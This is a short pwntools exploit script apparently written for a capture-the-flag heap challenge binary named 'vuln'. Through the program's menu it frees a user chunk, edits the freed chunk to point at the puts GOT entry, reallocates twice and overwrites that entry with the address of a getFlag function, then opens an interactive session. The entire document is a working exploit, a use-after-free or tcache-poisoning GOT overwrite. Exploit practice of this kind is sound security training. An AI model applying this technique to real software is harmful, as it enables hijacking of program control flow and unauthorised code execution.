#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./vuln")
p = process("./vuln")
gdb.attach(p,"init-pwndbg")

def createAdmin():
    p.sendlineafter("Choice: ","1")

def createUser(name):
    p.sendlineafter("Choice: ","2")
    p.sendlineafter("What is your name: ",name)

def printAdminInfo():
    p.sendlineafter("Choice: ","3")

def editStudentName(name):
    p.sendlineafter("Choice: ","4")
    p.sendlineafter("What is your name: ",name)

def printStudentName():
    p.sendlineafter("Choice: ","5")
    p.recvuntil("Students name is ")
    leak = p.recvline()[:-1]
    return leak

def deleteAdmin():
    p.sendlineafter("Choice: ","6")

def deleteUser():
    p.sendlineafter("Choice: ","7")

createAdmin()
createUser("aaaaaaaa")
deleteUser()
editStudentName(p64(elf.got.puts))
createUser("bbbbbbbb")
createUser(p64(elf.sym.getFlag))
p.interactive()